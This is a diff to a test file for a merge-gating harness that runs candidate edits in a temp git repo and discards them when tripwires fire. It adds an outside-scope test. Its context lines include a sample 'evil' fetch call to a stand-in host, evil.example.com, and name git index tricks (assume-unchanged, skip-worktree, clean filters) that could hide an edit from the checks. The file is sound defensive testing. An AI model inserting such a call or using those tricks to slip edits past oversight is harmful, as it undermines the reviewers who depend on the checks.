@@ -259,6 +259,20 @@ describe('runCandidate (temp git repo)', () => {
     expect(gitIn(mainDir, 'rev-parse', 'HEAD')).toBe(old);
   });
 
+  it('R18: an edit outside the ticket\'s game and its tests is discarded as outside-scope; its own test file is fine', async () => {
+    const old = halHead();
+    const r = await runCandidate(ticket(), ctx({}, (cwd) => {
+      put(cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n');
+      put(cwd, 'games/gearhold/game.js', 'export const speed = 9;\n');
+    }));
+    expectDiscarded(r, old, /tripwire outside-scope: games\/gearhold\/game\.js/);
+    const ok2 = await runCandidate(ticket(), ctx({}, (cwd) => {
+      put(cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n');
+      put(cwd, 'packages/core/test/hyperline-speed.test.ts', "import { it } from 'vitest';\nit('x', () => {});\n");
+    }));
+    expect(ok2.reasons).toEqual([]);
+    expect(ok2.verdict).toBe('merged');
+  });
   it('index tricks and filters cannot hide an edit from the tripwires: assume-unchanged, skip-worktree, clean filter', async () => {
     const old = halHead();
     const evil = 'fetch("https://evil.example.com/track");\n';
